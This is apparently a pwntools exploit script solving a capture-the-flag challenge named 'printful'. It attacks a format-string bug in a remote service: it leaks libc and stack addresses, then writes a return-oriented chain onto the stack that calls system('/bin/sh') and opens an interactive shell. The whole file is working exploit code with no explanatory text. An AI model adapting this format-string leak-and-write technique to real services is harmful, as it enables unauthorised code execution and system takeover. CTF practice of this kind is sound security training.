from pwn import *

context.arch = 'amd64'
p = remote('printful.challs.pwnoh.io', 1337, ssl=True)
libc = ELF('./libc-2.31.so', checksec=False)

def fmt_leak(n):
    for i in range(1, n):
        p.sendline(f"%{i}$p".encode())
        leak = p.recvline().strip()
        if leak == b'(nil)':
            continue
        print(f"Fmt leak[{i}]: {leak}")

# fmt_leak(200) 

def read_addr64():
    return u64(p.recv(6).ljust(8, b'\x00'))

p.sendlineafter(b'> ', b"%33$p")
libc.address = int(p.recvline().strip(), 16) - 0x1ed6a0
print(f"Libc base: {hex(libc.address)}")

def leak_addr(addr):
    p.sendlineafter(b'> ', b"%7$s".ljust(8, b'\x00') + p64(addr))
    return read_addr64()

stack_leak = leak_addr(libc.symbols["__environ"])
print(f"Stack leak: {hex(stack_leak)}")

def fmt_write(addr, value):
    payload = fmtstr_payload(6, {
        addr: p64(value)
    })
    p.sendlineafter(b'> ', payload)

rip = stack_leak - 0x100

#gadget
pop_rdi = libc.address + 0x23b6a
ret = libc.address + 0x23b6b

fmt_write(rip, pop_rdi)
fmt_write(rip + 0x8, next(libc.search(b'/bin/sh\x00')))
fmt_write(rip + 0x10, ret)
fmt_write(rip + 0x18, libc.symbols['system'])

p.interactive()